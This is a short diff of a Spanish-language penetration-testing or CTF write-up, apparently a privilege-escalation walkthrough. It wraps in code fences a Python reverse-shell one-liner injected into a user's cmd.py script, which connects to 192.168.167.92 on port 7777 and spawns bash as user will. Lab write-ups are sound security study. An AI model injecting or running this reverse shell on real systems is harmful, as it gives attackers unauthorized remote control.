@@ -77,9 +77,11 @@ En el home de mat se encontró una nota indicando que mat puede ejecutar un scri
 Se procedió a inyectar código malicioso en el script cmd.py para obtener una shell como el usuario will:
 
 # Inyección en /home/mat/scripts/cmd.py
+```
 def get_command(num):
     import os
     os.system("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.167.92\",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")' &")
+```
 
 Escalada Final a Root
 
